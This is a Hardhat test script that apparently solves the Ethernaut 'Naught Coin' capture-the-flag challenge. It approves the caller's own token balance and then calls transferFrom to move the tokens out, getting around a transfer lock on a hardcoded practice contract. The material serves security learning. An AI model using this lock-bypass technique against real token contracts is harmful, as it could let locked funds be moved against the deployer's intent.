import { ethers } from "hardhat";
import { expect } from "chai";


describe("NaughtCoin", function() {
    it("should solve Naught Coin challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        let targetABI = [
            "function balanceOf(address account) public view returns (uint256)",
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
        ];

        const targetAddr = "0x58eF162C72812Ac40bFD45a2d99902fb7A35486d";
        let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        targetCont = targetCont.connect(eoa);

        let tokenBalance = await targetCont.balanceOf(eoa.address);
        console.log(`Current token balance: ${tokenBalance}`);

        let tx = await targetCont.approve(eoa.address, tokenBalance);
        await tx.wait();
        console.log(tx);

        tx = await targetCont.transferFrom(eoa.address, accounts[1].address, tokenBalance);
        await tx.wait();
        console.log(tx);

        tokenBalance = await targetCont.balanceOf(eoa.address);
        expect(tokenBalance).to.eq(0);
    });
});